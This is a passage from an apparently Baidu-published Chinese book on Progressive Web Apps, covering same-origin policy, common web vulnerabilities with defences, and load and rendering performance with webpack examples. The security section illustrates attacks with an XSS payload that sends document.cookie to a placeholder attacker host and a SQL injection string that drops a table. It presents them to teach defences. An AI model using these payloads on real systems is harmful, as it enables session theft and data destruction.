otherexample.com 发送消息： let targetWindow = document.getElementsByTagName('iframe')[0] targetWindow.postMessage('Hello World!', 'http://otherexample.com') 在 otherexample.com 中监听 message 事件，进行处理： window.addEventListener('message', e => { let message = e.data }) 这种方式的适用场景有限，不能解决所有的跨域问题，且需要考虑浏览器的兼容性后再进行使用。 浏览器的同源策略是保证 Web 安全的重要法则，后续章节提到的客户端脚本攻击都与这一法则紧密相关，因此理解同源策略对我们构建安全可靠的 PWA 应用意义重大。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-05 11:04:20 "},"chapter07/4-vulnerability.html":{"url":"chapter07/4-vulnerability.html","title":"7.4 典型的安全漏洞","keywords":"","body":"常见的安全漏洞 在构建 PWA 站点的过程中，我们会面临很多的安全风险和漏洞，如 XSS，CSRF，SQL 注入漏洞，ClickJacking，文件上传漏洞 等等。在本小节中，我们列举几种客户端常见的安全漏洞，了解一下其原理和防范方法。 跨站脚本（XSS） XSS (Cross Site Scripting) 即跨站脚本攻击。为了和层叠样式表（Cascading Style Sheets，CSS）区分开，跨站脚本在安全领域叫做 XSS。攻击者往 Web 页面里注入恶意代码，当用户浏览这些网页时，就会执行其中的恶意代码，可对用户进行盗取 Cookie 信息、会话劫持、改变网页内容、恶意跳转等各种攻击。由于 XSS 漏洞易于出现且利用成本低，所以曾被 OWASP （一个关注 Web 应用程序安全的非营利性组织）列为当前的头号 Web 安全威胁。 我们举一个简单的例子说明它的原理，在 a.com 的搜索输入框中输入如下内容，并提交请求： location.href=http://www.bad.com/?cookie=document.cookie 如果前端没有进行过滤，提交搜索框表单后，浏览器地址可能变为： http://www.a.com/?query=location.href=http://www.bad.com/?cookie=document.cookie 此时，script 标签中的代码被执行了！用户的 Cookie 信息已经被发送到攻击者的服务器，攻击者便能利用收集的 Cookie 信息来伪造用户身份，进行多种恶意非法操作。这个例子是 XSS 漏洞的一种类型：反射性 XSS。根据效果不不同，XSS 攻击类型一般分为三种： 反射型 XSS 反射型 XSS 只是简单的把用户输入的数据“反射”给浏览器，XSS 脚本出现在 URL 请求参数里，也就是说需要诱使用户点击一个恶意链接，才能攻击成功。反射型 XSS 也叫作非持久型 XSS。 储存型 XSS 存储型 XSS 也被称为持久型 XSS，当攻击者输入一段恶意脚本后，被服务端接受保存，当用户访问这个页面时，恶意脚本就会被执行，从而造成漏洞。 DOM Based XSS 基于 DOM 的 XSS，通过对具体 DOM 代码进行分析，根据实际情况构造 DOM 节点进行 XSS 跨站脚本攻击，HTML 页面中使用 document.write 和 innerHTML 等方法，容易造成 DOM 节点中存在该类型的 XSS 漏洞。 防范 XSS 对于 XSS 攻击，我们可以做如下防范： 输入过滤 永远不要相信用户的输入，对用户输入的数据做一定的过滤。如输入的数据是否符合预期的格式，比如日期格式，Email 格式，电话号码格式等等。同时，后台服务器需要在接收到用户输入的数据后，对特殊危险字符如 ，> 等进行过滤或者转义处理，然后再存储到数据库中。 输出编码 服务器端输出到浏览器的数据，可以使用系统的安全函数来进行编码或转义来防范 XSS 攻击。输出 HTML 属性时可以使用 HTML 转义编码（HTMLEncode）进行处理，将 &，，>，\"，' 等进行转义之后再输出到页面代码中。 HttpOnly Cookie 这是预防 XSS 攻击窃取用户 Cookie 最有效的防御手段。Web 应用程序在设置 Cookie 时，将其属性设为 HttpOnly，客户端脚本将无法获取 Cookie 的值，这样能有效就避免该网页的 Cookie 被客户端恶意 JavaScript 窃取，保护用户 Cookie 信息安全。 跨站请求伪造（CSRF） CSRF (Cross Site Request Forgery)，即跨站请求伪造，是一种极易被开发者忽略的安全漏洞。简单的理解是，攻击者盗用了用户的身份，以用户的名义发送恶意请求。CSRF 能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账等，造成个人隐私泄露，财产损失。 举个例子，受害者用户登录网站 A，输入个人信息，在本地保存服务器生成的 Cookie。攻击者构建一条恶意链接，例如对受害者在网站 A 的信息及状态进行操作，典型的例子就是转账。受害者打开了攻击者构建的网页 B，浏览器发出该恶意连接的请求，浏览器发起会话的过程中携带了本地保存的 Cookie，A 网站收到 Cookie，以为是受害者发出的操作，导致受害者的身份被盗用，完成攻击者恶意的目的。如下图所示： 防范 CSRF 对于 CSRF 攻击，我们可以做如下防范： 验证码 这是一种比较简单有效的方法，它强制用户必须与应用进行交互才能完成最终的请求。特别是账户交易这种核心步骤，强制用户输入验证码，才能完成转账。在通常情况下，验证码够很好地遏制 CSRF 攻击。但增加验证码降低了用户的体验，网站不能给所有的操作都加上验证码。所以只能将验证码作为一种辅助手段，在关键业务点设置验证码。 Referer Check HTTP Referer 是 header 的一部分，当浏览器向 Web 服务器发送请求时，一般会带上 referer 信息告诉服务器是从哪个页面链接过来的，服务器以此可以获得一些信息用于处理。可以通过检查请求的来源来防御 CSRF 攻击。正常请求的 referer 具有一定规律，如在提交表单的 referer 必定是在该页面发起的请求。所以通过检查 http 包头 referer 的值是不是这个页面，来判断是不是 CSRF 攻击。 Anti CSRF Token 目前比较完善的解决方案是加入 Anti CSRF Token，即发送请求时在 HTTP 请求中加入一个随机产生的 token，保证其不可预测性，让攻击者无法猜测重要请求所需的参数。实际应用中，我们可以把 token 隐藏在表单中，服务器验证提交的 token 是否与 session 或 Cookie 中的值一致，来判断该请求是否合法。如果不合法，直接拒绝该请求。 归根到底，防范这种类型的威胁，需要我们在构建 PWA 应用时始终保持安全意识，对于任何敏感操作都要进行身份的确认，涉及到用户敏感信息的 Cookie 数据，需要进行生命周期和读取权限的严格限制，有关更多 CSRF 的防范方法，可以查看 OWASP 总结的文档：https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet 。 SQL 注入漏洞 注入攻击是 Web 安全领域的一种常见威胁，其本质就是把用户输入的数据当做代码来执行。前面提到的 XSS 其实也是一种针对 HTML 的注入，SQL 注入就是把非法的 SQL 命令通过 Web 表单等方式提交，在服务端后台执行，实现篡改数据库等恶意行为。 我们可以用一个简单的例子说明这种安全漏洞。现在有一条根据用户 uid 查询用户信息的 SQL 语句： SELECT * FROM UserTable WHERE ID = uid; 其中，变量 uid 的值来自用户提交的请求，在正常情况下，用户输入 123，SQL 语句会执行： SELECT * FROM UserTable WHERE ID = 123; 查询了用户表中 ID 为 123 的用户的所有字段信息。但假如前后端整个系统中，没有任何的安全处理，有攻击者恶意输入了如下语句： 123; drop table UserTable; 那么 SQL 语句在执行时的结果就是： SELECT * FROM UserTable WHERE ID = 123; drop table UserTable; 危险出现了！原来正常的查询语句，因为接收了非法的用户输入，变成了极其危险的删除表的操作，数据库安全受到了极大的威胁。 从上面简单示意我们不难想象，SQL 注入的危害极大，不仅会引发数据库中用户隐私信息的泄露，还能篡改数据库的数据，甚至攻击远程数据库服务器，安装后门，造成不可计量的损失。那么我们该如何防御这种安全威胁呢？ 在实际开发中，SQL 注入的防御并不是几句话能说清楚的事情，但我们可以从以下几个方面层层改进，让注入的风险降到最低。 1.永远不要信赖用户的输入。对输入的数据进行校验，过滤可能引发注入漏洞的字符，并检查输入的数据类型，如 id 必须为 Interger，输入邮箱严格按照邮箱的格式，日期也必须有特定格式等等，最大程度对抗恶意攻击。 2.使用预编译的参数化查询语句，不要拼接 SQL 语句。也可以使用安全的存储过程，先将 SQL 语句定义在数据库中。 3.严格管理数据库权限，不要使用管理员权限连接数据库。遵循最小权限原则，对不同应用的数据库连接权限进行严格控制。 4.重要信息加密存储。 SQL 注入的防范，需要记住永远将数据和代码分离的原则。只要我们设计并实施了合理的安全防御方案，这种危险完全可以避免。 上文只是简单列举了几种常见的攻击技术，实际情况中我们的应用受到的威胁远不止这些。总的来说，Web 安全是一个范围宽广又需要我们持续深入研究的重要话题，我们在构建 PWA 应用时，也要时刻从威胁防范的角度进行考虑，保障应用的稳定性和安全性。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter08.html":{"url":"chapter08.html","title":"第8章 性能","keywords":"","body":"性能 我们在 第一章 什么是 PWA 中提到，PWA 应该快速加载、及时响应用户反馈、提供流畅的动画、以及拥有类似 Native App 一般沉浸的用户体验。这每一点都表明，优秀的 PWA 对性能有很高的要求。 本章将主要讨论 Web 应用的性能，将从页面加载性能和渲染性能两个方面，详细介绍 Web 应用性能优化原理和手段。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter08/1-loading-performance.html":{"url":"chapter08/1-loading-performance.html","title":"8.1 加载性能 ","keywords":"","body":"加载性能 Web 页面由 HTML、CSS、JavaScript 和其他多媒体资源组成。页面加载时，必须从服务器获取这些资源。在这一节中，我们会围绕这些资源和网络请求，讨论如何优化页面加载性能。 减小资源体积 为了让页面更快加载，最容易想到的是减小资源体积。页面中最常见的资源有 HTML、CSS、JavaScript 等文本资源，以及字体、图像、音视频等多媒体资源。 压缩文本内容 压缩文本资源，就是在不改变资源有效性的情况下，通过删除多余空格、变量名替换、表达式改写等操作，来尽可能减小文本资源的体积。 压缩虽然简单，但十分有效，这也是最广泛的优化资源体积的操作。许多工具可以帮助我们完成文本压缩。目前主流的资源打包工具 webpack，生态较为繁荣，通过 loader 和 plugin 机制集成了多种常用的资源处理库。如 TerserPlugin 可以用于压缩 JavaScript，PostCSS 可以对 CSS 进行压缩，以及完成前缀自动补全工作。关于 webpack 的更多介绍，详见下文 使用 webpack 优化资源加载。 除了压缩单个文件外，在服务器上配置 Gzip 也十分重要。Gzip 对文本资源的压缩效果非常明显，通常可以将体积再压缩至原本的 30% 左右，但 Gzip 对已经单独压缩的图像等非文本资源来说，效果并不好。Apache、Nginx 等服务器都提供了 Gzip 功能，可以分别在配置文件 .htaccess、nginx.conf 中进行相应的配置。开启 Gzip 后，资源文件的 HTTP 响应头部中， Content-Encoding 也会变为 gzip。 优化 JavaScript 第三方库引入 在现代 Web 单页应用中，JavaScript 往往成为了最重要的文本资源。除了用于页面渲染的 JavaScript 框架外，还有许多工具库被广泛引用，如 lodash、underscore，甚至 jquery 等。 不计后果地引入第三方库，会迅速增大 JavaScript 资源的体积。如果我们只需要使用工具库中少数几个简单函数，可以考虑使用原生 JavaScript 代替。 实际上，由于现代前端框架大幅普及，以及浏览器兼容性问题日益减少，我们对 jQuery 的依赖已经不像过去那样强了。在《You Don't Need jQuery》（https://github.com/nefe/You-Dont-Need-jQuery）一文中，就详细地描述了如何使用原生 JavaScript 代替 jQuery。 同时，随着 ES6 及后续标准的持续改进，原生 JavaScript 能力被大大增强了。我们可以从《You don't (may not) need Lodash/Underscore》（https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore）一文中，了解到如何使用现代 JavaScript 实现常用的工具函数。 不过，在实际项目中，lodash 等工具库往往十分有用。lodash 不仅包含了许多常用的函数，而且每个函数都有相当丰富的单元测试，代码质量很高。需要注意的是，我们在引入 lodash 时，应该仅引入所需的函数，而不是将整个库全部引入进来。类似的，如 moment 等一些较为庞大的第三方库，也需要在引入时进行体积优化。具体的实践详见下文 使用 webpack 优化资源加载。 对资源进行缓存 除了对资源文本大小进行优化外，还可以从缓存的角度进行考虑。缓存无处不在，往往能大幅加快响应速度，从而在优化页面加载性能的工作中有举足轻重的作用。在上文中已经介绍过 Cache Storage 和 IndexedDB 等缓存技术，这一节主要关注 HTTP 缓存。 HTTP 缓存 现代浏览器都实现了 HTTP 缓存机制。浏览器在初次获取资源后，会根据 HTTP 响应头部的 Cache-Control 和 ETag 字段，来决定该资源的缓存策略。 Cache-Control 有多个可能的字段值： no-store：表明任何缓存不得存储该资源，每次请求都会从服务端返回完整的内容。 no-cache：表明必须向服务端发一次请求，该请求头部带有 If-None-Match 等资源校验信息。服务端将会验证该资源是否被修改过，详细见下文 ETag 的描述。 public：表明该资源可以被 CDN 或代理等中间人缓存。 private：与 public 相反，表明任何中间人不得缓存该资源，资源可能与隐私信息相关。 max-age：指定了资源缓存的过期时间（秒），仅当缓存过期后才会向服务端发送请求。 ETag 是由服务端决定的一个资源校验字段。如果浏览器缓存已经过期，那么会向服务端询问该资源是否被修改过。服务端会将 HTTP 请求头部的 If-None-Match 与 ETag 进行比对。如果相等，则表明资源并没有被修改过，服务端返回 304 Not Modified，浏览器可以直接从缓存获取资源，并刷新缓存过期时间。否则就需要返回该资源的完整内容。 为了达到最佳缓存效果，常用的做法是： 对于 HTML 文件，设置 Cache-Control: no-cache。 对于 CSS 和 JavaScript 等静态资源，上线构建的时候在文件名中插入一段仅与文件内容相关的哈希值，并使用 Cache-Control: max-age=31536000 进行长缓存。 这样的效果是，对于绝大多数静态资源的请求都可以使用缓存来响应，并且仅在文件内容变更时刷新缓存。具体的实践详见下文 使用 webpack 优化资源加载。 调整资源优先级 页面加载时，浏览器会对各种类型的资源分配默认优先级。一般来说，CSS 会被分配最高优先级，JavaScript 会被分配高优先级，而图像则被分配了低优先级，等等。虽然并不能真正修改这些优先级，但我们仍能通过预加载、懒加载等多种方式，调整资源加载的行为，优化网页加载性能。 预加载 是一种通用的预加载方式，支持几乎所有常用资源类型。我们可以在 中，通过 来提前声明当前页面所需的资源，以便浏览器能预加载这些资源。一个实际的预加载例子如下： 上述例子中，预加载了 CSS、JavaScript、图像和字体文件。 as 属性表明了资源的类型，从而浏览器才会为后续的 、 和 CSS 文件中的 url() 声明使用预加载的资源，而不是再发起一次请求。另外，还可以通过 media 属性进行媒体查询，根据响应式的情况选择性地预加载资源。 预连接与 DNS 预解析 如果不希望对资源进行预加载，那么也可以考虑使用 ，提前与资源建立 socket 连接。预连接会提前完成 DNS 解析、TCP 握手和 TLS 协商的工作，但并不会提前加载资源，用法如下代码所示。 DNS 预解析与预连接类似，通过 声明，但仅会提前进行 DNS 解析。 预取 预取通过 声明，通常用于提前加载用户接下来可能需要的资源，如点击“下一页”的页面等。浏览器会在空闲时，使用最低优先级下载预取的资源，用法如下代码所示。 浏览器并不会递归地进行预取。如上述例子中，next-page.html 需要预取的资源，并不会在当前页面提前下载。 懒加载 可以对图像资源采用“懒加载”策略，即仅加载当前在视口内的图像，而对于视口外未加载的图像，在其即将滚动进入视口时才开始加载。 IntersectionObserver 可以帮助我们高效地判断元素是否进入视口。一个简单的图像懒加载功能实现如下： document.addEventListener('DOMContentLoaded', () => { const images = [...document.querySelectorAll('img')] const observer = new IntersectionObserver(entries => { entries.forEach((entry) => { if (!entry.isIntersecting) { return } const image = entry.target image.src = image.dataset.src image.srcset = image.dataset.srcset observer.unobserve(image) }) }) images.forEach(image => observer.observe(image)) }) 但 IntersectionObserver 的浏览器兼容性目前并不太好，可按需引入相应的 polyfill 进行兼容。当然，也可以使用较传统的方法，监听图像元素的 scroll、resize、orientationchange 事件，通过 getBoundingClient() 来判断元素是否在视口内，从而实现懒加载。 import {throttle} from 'lodash' document.addEventListener('DOMContentLoaded', () => { let images = [...document.querySelectorAll('img')] const lazyLoad = throttle(() => { images = images.filter((image) => { const imageRect = image.getBoundingClientRect() if (imageRect.top >= innerHeight || imageRect.bottom 需要注意的是，我们还应该根据图像加载后的大小，设置图像占位符。这样可以避免图像加载后触发页面重新布局，造成页面闪烁。关于页面布局的详细内容，在后面章节的渲染性能的内容里会详细介绍。 对于视频同样可以采用懒加载策略。与图像懒加载的差别是，占位符使用 的 poster 属性实现，以及需要遍历子 元素将 data-src 修改为 src 。由于原理十分类似，这里不再重复展开。 使用 webpack 优化资源加载 webpack 是现代 Web 应用最常用的资源打包工具。接下来会以 webpack 4 为例，简单介绍一下如何使用 webpack 实现上文提到的各种优化手段。对于其他版本的 webpack，仅在具体配置上可能会有所出入，而背后的原理都是相同的。 区分开发环境和生产环境 设置 node 环境变量 NODE_ENV 可以用来区分开发环境和生产环境，一般用 development 表示开发环境，而 production 则表示生产环境。设置后，我们就可以在项目的构建脚本中，通过 process.env.NODE_ENV 获取当前环境，根据环境进行 webpack 的差异化配置了。 通常会使用 cross-env 库提供的 cross-env 命令来设置环境变量，这样做是为了兼容 Windows 系统。 cross-env NODE_ENV=production webpack 同时，需要将 webpack 配置中的 mode 选项设置为对应的环境。webpack 会根据不同环境，进行一些默认的配置，如 mode 为 production 时，会将 optimization.minimize 设置为 true，表明 webpack 将会使用 TerserPlugin 插件压缩 JavaScript 构建产物。关于不同 mode 配置下的详细效果，可参考官方文档。 // webpack.config.js module.exports = { mode: 'production' // 或 'development' } 设置 mode 后，项目中就可以根据不同环境编写代码了，如仅在开发环境下才输出的日志等。这是由于 webpack 会使用内置的 DefinePlugin 插件将项目源代码中出现的所有 process.env.NODE_ENV 直接替换为 mode 对应的环境。 if (process.env.NODE_ENV === 'development') { console.log('This app is in development mode.') } 上述代码，在生产环境下会被编译为： if ('production' === 'development') { console.log('This app is in development mode.') } 这个分支的判断条件始终为 false。从而，在 webpack 生产环境下默认开启使用的 TerserPlugin 插件，会将这段代码完全删除。我们在构建产物中将看不到整个 if 语句块了。 Tree shaking 历史上，JavaScript 有过多种模块化标准，如 CommonJS、AMD 和 ES modules。我们在实际项目中使用的第三方库，通常会提供通过 CommonJS 和 ES modules 导出的两个版本。一个典型的 package.json 文件，包含 main 和 module 两个字段，分别是通过两种模块化标准导出的文件入口。webpack 优先会读取 module 字段表明的文件入口。当 module 不存在时，才会从 main 中导入。 { // ... \"main\": \"lib/index.js\", \"module\": \"es/index.js\", // ... } 由于 CommonJS 标准允许在代码中动态导入其他模块，从而无法准确分析哪些模块被导入了。但 ES modules 标准的模块导入是静态的，使得模块间依赖可以通过静态分析来更好地优化了。关于 ES modules 标准新增的动态导入特性 import()，会在后面的合理拆分代码章节中详细介绍，下面先来看一个简单的示例，假设现在有两个文件 math.js 和 index.js，它们的内容分别如下所示： // math.js export const add = (a, b) => a + b export const mul = (a, b) => a * b // index.js import {add} from './math' console.log(add(1, 2)) 上述代码中，mul 函数将不会出现在构建产物中。这种优化技术被形象地称作 Tree shaking（摇树）。mul 函数就像树上枯萎的叶子一样，摇树后自然就掉下来了。 在实际项目中，为了浏览器兼容性考虑，我们通常会使用 Babel 等编译器来编译现代 JavaScript 代码。为了启用 Tree shaking，应该确保编译器不将 ES modules 语法编译到其他模块化标准。 部分常用的第三方库无法使用 Tree shaking，通常需要使用专门的工具进行处理。如 babel-plugin-lodash 会对引入了 lodash 的文件进行额外处理。 // 处理前 import _ from 'lodash' import { add } from 'lodash/fp' const addOne = add(1) _.map([1, 2, 3], addOne) // 处理后 import _add from 'lodash/fp/add' import _map from 'lodash/map' const addOne = _add(1) _map([1, 2, 3], addOne) 容易看出，不经过处理的文件会引入整个 lodash 库，这不是我们想要的结果。而经过 babel-plugin-lodash 处理后，则仅会引入我们所需的两个函数，大大减小了打包后的代码体积。 对于另一个体积较大的第三方库 moment 来说，使用 ContextReplacementPlugin 可以仅引入我们所需的本地化语言，而不是将所有语言都打包进来。 // webpack.config.js const {ContextReplacementPlugin} = require('wbepack') module.exports = { // ... plugins: [ new ContextReplacementPlugin(/moment[/\\\\]locale$/, /zh-cn/) ] } 启用长期缓存 webpack 在生成打包文件时，可以在文件名中插入一段仅与文件内容相关的哈希值。仅当该文件更新后，缓存才会失效，这样可以充分利用 HTTP 缓存。 配合 html-webpack-plugin 插件可以很方便地将生成的打包文件路径插入 HTML 中。 注意到 webpack 自身有一些运行时的代码，容易破坏缓存有效性，我们应该将这些代码单独打包。进一步的，可以将打包后的 webpack 运行时代码直接插入 HTML 中，以节省一次 HTTP 请求。 打包文件中模块的相互引用，都是通过 webpack 赋予的 id 来查找的，默认为自增的计数器。当新增或删除某些模块时，对应的 id 很可能会发生改变，这样就破坏了长期缓存。同样道理，我们应该使用稳定的哈希值作为模块的 id。 // webpack.config.js const {HashedModuleIdsPlugin} = require('webpack') const HtmlPlugin = require('html-webpack-plugin') const InlineManifestPlugin = require('inline-manifest-webpack-plugin') module.exports = { output: { filename: '[name].[chunkhash].js' }, optimization: { runtimeChunk: 'single' }, plugins: [ new HashedModuleIdsPlugin(), new HtmlPlugin(), new InlineManifestPlugin() ] } 合理拆分代码 我们往往不需要在首屏一次性加载所有 JavaScript 代码。为了加快首屏展现的速度，可以将当前暂时不需要的代码拆分出去。webpack 支持根据 import() 方法的调用处，把异步加载的模块拆成一个独立的 JavaScript 分片。 假设现在有一个首屏渲染用不到的 huge-component.js 模块，其代码如下所示： // huge-component.js export default HugeComponent = () => /* ... */ 在首页引入的 index.js 模块中，为了不默认将 huge-component.js 模块引入进来打包成一个大的产物，可以借助 import() 方法将 huge-component.js 模块拆分出去，如下代码所示： // index.js if (/* ... */) { import('./huge-component').then(({default: HugeComponent}) => /* ... */) } 上述例子通过 webpack 打包后，会将 huge-component.js 作为一个打包新入口，拆成一个独立的 JavaScript 文件。仅在 if 语句块内执行 import() 时，才会对该分片 JavaScript 资源发送异步请求。 合理拆分代码，不仅能显著提升首屏加载性能，还能获得更好的缓存效果。当仅修改少数几个分片的代码时，其他分片的缓存仍然有效。 压缩文本内容 JavaScript 在生产环境下默认开启压缩，无需额外配置。这里以 CSS 为例，在 webpack 中使用 postcss-loader，利用 PostCSS 的插件 cssnano 可以完成 CSS 的压缩，并且可以额外使用 autoprefixer 完成补全属性前缀的任务。postcss-loader 对应的 postcss.config.js 配置文件如下： // postcss.config.js module.exports = { plugins: { autoprefixer: {}, cssnano: { preset: [ 'default', { discardComments: { removeAll: true } } ], zindex: false, reduceIdents: false } } } 对于其他资源，也会有对应的 loader 或 plugin 来完成压缩任务，这里不再一一列举。 分析资源体积 webpack-bundle-analyzer 是一个关于 webpack 构建产物的可视化插件，可以清晰地看到构建产物的体积，以及这些产物分别包含了哪些模块。我们能得知对于资源体积的优化是否生效，并分析出后续的优化方向。也能轻易监控出是否意外引入了不必要的库，增大了构建产物的体积。 // webpack.config.js const {BundleAnalyzerPlugin} = require('webpack-bundle-analyzer') module.exports = { // ... plugins: [ new BundleAnalyzerPlugin() ] } Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter08/2-rendering-performance.html":{"url":"chapter08/2-rendering-performance.html","title":"8.2 渲染性能 ","keywords":"","body":"渲染性能 在上文中，我们从多个角度讨论了如何优化页面加载性能。但一个用户体验良好的页面，不仅要快速加载，还需要有一系列流畅的交互。从而，这一节我们把目光投向页面渲染性能。 渲染流程 浏览器在渲染页面前，首先会将 HTML 文本内容解析为 DOM，将 CSS 解析为 CSSOM。DOM 和 CSSOM 都是树状数据结构，两者相互独立，但又有相似之处。DOM 树描述了 HTML 标签的属性，以及标签之间的嵌套关系，如 对象的子节点包含 和 对象，而 对象的子节点可能有 对象等。CSSOM 树与 DOM 树类似，但节点描述的是由 CSS 解析得到的选择器及其样式信息。 接着，浏览器会将 DOM 和 CSSOM 树合并成渲染树。从 DOM 树的根节点开始遍历，并在 CSSOM 树中查找节点对应的样式规则，合并成渲染树中的节点。在遍历的过程中，不可见的节点将会被忽略，如 、 等标签，以及样式中含有 display: none 的节点，但含有 visibility: hidden 的节点会被保留。这也是为什么后者仍会在页面中占据布局空间的原因。 渲染树随后会被用于布局，就是计算渲染树节点在浏览器视口中确切的位置和大小。布局的过程十分复杂。比如，一个普通的块级元素，其宽度会依赖于父元素的宽度，而高度则会依赖这个元素的内容。又比如，多个普通的块级元素，原本只会在页面中从上到下排列，但通过 Flexbox、浮动或定位，会改变元素布局的行为。显而易见，浏览器进行一次布局的性能开销较大，我们需要小心地避免频繁触发页面重新布局。 得到渲染树节点的几何布局信息后，浏览器就可以将节点绘制到屏幕上了，包括绘制文本、颜色、边框和阴影等。绘制的过程，非常简略地说，首先会根据布局和视觉相关的样式信息生成一系列绘制操作，随后执行栅格化（栅格化是将向量图形格式表示的图像转换成位图以用于显示器或者打印机输出的过程），将待绘制项转换为位图存储在 GPU 中，最终通过图形库将像素绘制在屏幕上。 页面不是一次性被绘制出来的。实际上，页面被分成了多个图层进行绘制，这些图层会在另一个单独的线程里绘制到屏幕上，这个过程被称作合成。合成线程可以对图层进行剪切、变换等\u0010\u0010处理，因此可以用于响应用户基本的滚动、缩放等操作，又不会受到主线程阻塞的影响。 到目前为止，在经历了构建 DOM 和 CSSOM、构建渲染树、布局、绘制、合成等多个步骤后，渲染的基本流程就结束了。但我们能通过 JavaScript 操作 DOM 或修改样式，这会导致渲染树的重新计算，浏览器可能需要对页面重新布局、重绘与合成。 关键渲染路径 通过上文的介绍，我们知道渲染树是由 DOM 和 CSSOM 组合而成的。因此，在 HTML 和 CSS 没有加载完成前，页面不会渲染任何内容。换句话说，HTML 和 CSS 都是会阻塞页面渲染的资源。除此之外，JavaScript 也会阻塞页面渲染。浏览器在解析 HTML 时，如果遇到 标签时，一般会暂停解析，直到 JavaScript 执行完毕后才会继续解析剩余的 HTML。对于外部 JavaScript，在执行前还需额外等待请求的时间。这些首屏渲染所必须的关键资源，共同组成了关键渲染路径。接下来，我们会讨论如何通过缩短关键渲染路径来优化首屏性能。 延迟非关键 CSS 加载 通过 引用的 CSS 都会在加载时阻塞页面渲染。但 Web 应用中往往会有一些首屏渲染时用不到的 CSS，如弹框的样式等。为了使这些非关键 CSS 不阻塞页面渲染，我们可以通过别的途径声明 CSS 的加载。 在上文 加载性能 中提到，我们可以通过 预加载我们所需的资源。这里仅需稍作改动，就能满足我们的要求。 上面的例子非常直观，我们在 中监听了 onload 事件，并在 CSS 加载完成后，通过修改 rel 为 stylesheet 来将 CSS 应用到页面上，这就绕过了 CSS 会阻塞页面渲染的限制了。在需要考虑浏览器兼容性的情况下，推荐使用 loadCSS 来实现非关键 CSS 的加载。 对于首屏渲染所必须的关键 CSS，可以考虑通过 内联，或使用 HTTP/2 服务端推送的方式来加载，可以节省一次网络请求。这里不再进一步展开。 async 和 defer 上文提到，页面中的 会阻塞后续 DOM 的构建。为了使 JavaScript 能与页面中所有的 DOM 进行交互，最常见的引入方式是将 置于 的最底部。 绝大多数情况下，我们都不会使用如 document.write() 这样的方法，所以 在页面中的位置通常都是无关紧要的。另外，JavaScript 可能会修改样式，如果此时 CSSOM 树还未构建完成，则 JavaScript 的执行又会进一步被 CSS 加载所阻塞。针对这些弊端， 提供了 async 和 defer 两个属性，它们的用法十分类似。 当浏览器解析到 时，会对该 JavaScript 文件发起异步请求。请求成功后才会暂停 HTML 解析，并立即执行 JavaScript。在实际项目中容易发现，多个 的执行顺序是不确定的。而且在 JavaScript 执行时，页面的 DOM 可能还未全部构建完成。 对于 来说，浏览器同样会发起异步请求，但 JavaScript 会延迟到 HTML 解析完毕后依次执行。此时 JavaScript 已经能和完整的 DOM 进行交互了。 两者各有千秋，选择 还是 完全取决于我们的实际需求。 非阻塞 JavaScript 由于 JavaScript 一般是单线程执行的，长时间执行的任务会阻塞浏览器的主线程，使页面失去响应。当响应用户操作的时间超过 100ms 时，用户就已经能察觉到轻微的延迟和卡顿了。为了能在 100ms 内快速响应用户的操作，应尽量在 50ms 内处理事件。这是由于当前事件触发时，可能会有其他正在处理的事件，阻塞了当前事件的响应，造成页面卡顿。如果每个事件都在 50ms 内处理完，那么至多只需 100ms 就能响应用户的操作了。如果确实需要超过 50ms 才能处理完事件，就应该给用户提供执行进度的反馈。 同时，用户对于不流畅的滚动或动画十分敏感，一般要求页面帧率应达到每秒 60 帧。在这个帧率下，每帧的渲染需要在 16ms 内完成。但浏览器还需要花费大约 6ms 的时间将一帧绘制到屏幕上，从而只给我们留下了 10ms 时间生成一帧。由此可见，动画对于实时性要求比较苛刻，我们应该尽可能不在动画中进行其他计算。如果确实需要计算相关数据的，可以尝试将这些逻辑移到上文所述处理事件的 50ms 内进行预处理。 当页面无法及时响应用户操作，或者存在复杂和低效的动画时，最终都会严重影响用户体验。 页面滚动 最常见的动画是由用户触发的滚动操作。在移动 Web 应用中，当我们拖动屏幕时，页面一般会跟随手指进行滚动。但当我们监听 touchstart、touchmove 等事件时，由于合成线程并不知道我们是否会通过 event.preventDefault() 来阻止默认的滚动行为，从而在每次事件触发时，都会等待事件处理函数执行完毕后再进行页面滚动。这通常会导致较明显的延迟，影响页面滚动的流畅性。 document.addEventListener('touchstart', handleTouchStart, {passive: true}) 我们可以通过在 addEventListener() 时声明 {passive: true} ，来表明事件处理函数不会阻止页面滚动，使得用户的操作更快得到响应。 requestAnimationFrame JavaScript 可以进行样式更新，而动画则是以 16ms 为间隔的一连串的样式更新组成。最直接的想法是，可以通过 setInterval() 或递归调用 setTimeout() 来编写动画，如下代码所示。 function render () { element.style.top = element.offsetTop + 1 + 'px' element.style.left = element.offsetLeft + 1 + 'px' setTimeout(render, 16) } setTimeout(render, 16) 上述代码实现了一个性能非常差劲的动画，其效果是使一个绝对定位的元素，从页面左上至右下漂浮。但我们用肉眼就能发现，动画产生了卡顿和掉帧的现象。这是由于 setTimeout 和 setInterval 的回调函数会在浏览器渲染两帧之间的任何时间点执行，而定时器的 16ms 又不是特别精确，从而有可能使一次样式变更错过浏览器渲染。 为了实现平滑流畅的动画效果，我们应该使用 requestAnimationFrame() 方法来代替定时器，requestAnimationFrame() 方法接收一个回调函数为参数，其回调函数不在浏览器事件循环中调度，而是在浏览器渲染下一帧之前执行，这可以确保动画不会掉帧。requestAnimationFrame 的回调函数接收一个高精度时间戳 timestamp，类似于 performance.now() 的返回值，代表回调被执行的精确时间，其用法通常如下代码所示。 function render (timestamp) { // 执行渲染的具体逻辑 // ... requestAnimationFrame(render) } requestAnimationFrame(render) 对于需要长时间执行的任务，我们可以尝试把它拆分成多个小任务，然后通过 requestAnimationFrame() 进行调度，以确保页面的流畅性。上文提到生成一帧的时间应该在 10ms 